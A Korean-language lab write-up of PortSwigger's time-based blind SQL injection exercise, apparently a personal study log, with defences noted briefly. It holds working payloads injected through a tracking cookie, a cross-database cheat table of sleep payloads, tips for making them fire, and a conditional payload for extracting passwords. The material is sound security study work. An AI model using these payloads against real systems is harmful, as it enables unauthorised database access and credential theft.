# Lab: Blind SQL injection with time delays

## 개요

- **난이도**: Practitioner
- **주제**: SQL Injection — Blind / Time-based
- **링크**: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
- **참고**: https://portswigger.net/web-security/sql-injection/cheat-sheet

## 목표

TrackingId 쿠키에 time delay 페이로드를 삽입하여 응답 지연을 유발함으로써 SQL injection 취약점이 존재함을 확인한다.

## 이전 랩들과의 차이

이 랩은 데이터를 추출하는 것이 목표가 아니다. **응답 지연 발생 여부만으로 취약점을 확인**하는 것이 목표다.

| 항목 | 011~013 | 014 |
|------|---------|-----|
| 목표 | 비밀번호 추출 | 취약점 존재 확인 |
| 단서 | 응답 내용 / 에러 코드 / 에러 메시지 | 응답 시간 지연 |
| 데이터 추출 | O | X (확인만) |

time-based는 응답 내용·에러 코드·에러 메시지 등 **어떤 차이도 없는 환경**에서 마지막으로 시도하는 방법이다.

## 풀이

### 1단계 — 기본 페이로드 시도

cheat sheet의 PostgreSQL time delay 항목을 참고해 가장 단순한 형태로 시도했다.

```
TrackingId=ogAZZfxtOKUELbuJ'||pg_sleep(10)--
```

→ **PortSwigger 랩 환경에서는 10초 지연이 발생했다.** 그러나 동일한 페이로드를 로컬 PostgreSQL DB에서 직접 쿼리로 실행하면 `pg_sleep(10)`이 호출되지 않았다. 랩 환경의 쿼리 구조가 로컬과 달라 `||` 연결 방식이 동작한 것으로 보인다.

### 2단계 — 로컬·랩 모두 동작하는 구조 확인

`AND EXISTS`로 서브쿼리 안에서 함수를 강제 실행하는 구조는 **로컬 PostgreSQL과 랩 환경 모두에서** 안정적으로 동작했다.

```
TrackingId=ogAZZfxtOKUELbuJ' AND EXISTS(SELECT 1 FROM pg_sleep(10))--
```

→ 두 환경 모두 응답이 약 10초 지연되어 반환되었다.

## 핵심 정리

- `||pg_sleep(10)--`은 PortSwigger 랩 환경에서는 동작했지만, 로컬 PostgreSQL에서 직접 쿼리로 실행하면 `pg_sleep()`가 호출되지 않았다. 실행 환경(쿼리 구조, DB 설정)에 따라 동작 여부가 달라진다.
- `AND EXISTS(SELECT 1 FROM pg_sleep(N))` 구조는 로컬과 랩 환경 모두에서 안정적으로 동작했다. 서브쿼리 안에서 함수를 강제 실행하는 이 구조가 더 범용적이다.
- time delay는 데이터 추출이 아니라 **"이 파라미터가 SQL로 실행되고 있는가"를 확인하는 수단**이다.
- **방어**: Prepared Statement 사용, DB 함수 실행 권한 최소화.

## 배운 점 및 추가 학습

### 1. ||pg_sleep()의 환경별 동작 차이

```sql
-- 원본 추정 쿼리
SELECT * FROM tracking WHERE id = 'INPUT'

-- ||pg_sleep(10) 삽입 시
SELECT * FROM tracking WHERE id = 'xyz'||pg_sleep(10)--'

-- PortSwigger 랩: pg_sleep(10) 호출되어 지연 발생
-- 로컬 PostgreSQL: pg_sleep()는 void 반환 → 문자열 연결 불가 → 호출되지 않음
-- 환경에 따라 결과가 다르므로 이 방식만 믿기 어렵다
```

```sql
-- AND EXISTS 삽입 시
SELECT * FROM tracking WHERE id = 'xyz' AND EXISTS(SELECT 1 FROM pg_sleep(10))--'

-- EXISTS가 서브쿼리를 강제 실행 → pg_sleep(10) 호출 → 10초 지연
-- 랩·로컬 모두 동일하게 동작
```

### 2. DBMS별 time delay 함수

| DBMS | 함수 / 방법 | 예시 페이로드 |
|------|------------|---------------|
| PostgreSQL | `pg_sleep(N)` | `' AND EXISTS(SELECT 1 FROM pg_sleep(10))--` |
| MySQL | `SLEEP(N)` | `' AND SLEEP(10)--` |
| MSSQL | `WAITFOR DELAY` | `'; WAITFOR DELAY '0:0:10'--` |
| Oracle | `dbms_pipe.receive_message` | `' AND 1=dbms_pipe.receive_message('a',10)--` |

MySQL의 `SLEEP()`은 조건절에서 직접 사용 가능하지만, PostgreSQL의 `pg_sleep()`은 실행 컨텍스트를 맞춰야 한다.

### 3. Time delay 페이로드가 동작하지 않을 때 점검 사항

실제 환경에서 time delay가 발생하지 않을 때 확인해야 할 요소들이다.

| 점검 항목 | 내용 |
|-----------|------|
| 함수 실행 컨텍스트 | `||` 연결 대신 `AND EXISTS`, `AND 1=(SELECT ...)` 등으로 실행 강제 |
| DBMS 종류 | 대상 DBMS에 맞는 함수 사용 (pg_sleep vs SLEEP vs WAITFOR) |
| 주석 처리 | `--`, `#`, `/**/` 중 해당 환경에서 동작하는 주석 사용 |
| 네트워크 지연 | 기준 응답 시간을 먼저 측정하고 delay 값을 충분히 크게 설정 |
| 권한 부족 | 일부 환경에서 time delay 함수 실행 권한이 제한될 수 있음 |

### 4. Time-based Blind SQLi의 한계와 주의사항

- 네트워크 지연이나 서버 부하로 인한 응답 지연과 구분하기 어렵다. 여러 번 반복해서 일관성을 확인해야 한다.
- 데이터를 한 비트씩 추출하면서 매 요청마다 N초를 기다려야 하므로 **011·012보다 훨씬 느리다**.
- 서버에 실제 부하를 주기 때문에 운영 환경에서는 서비스 영향을 줄 수 있다.

### 5. 추가로 고민해볼 것

- 이 랩은 취약점 **확인**만 하지만, 다음 랩(015)에서는 time delay를 단서로 삼아 실제 **데이터 추출**까지 진행한다.
- time delay를 조건부로 걸면 011의 conditional responses와 동일한 이진 탐색 구조로 데이터를 추출할 수 있다.
  ```sql
  -- 첫 글자가 'a'보다 크면 10초 지연
  ' AND EXISTS(SELECT 1 FROM pg_sleep(CASE WHEN SUBSTRING(password,1,1)>'a' THEN 10 ELSE 0 END))--
  ```
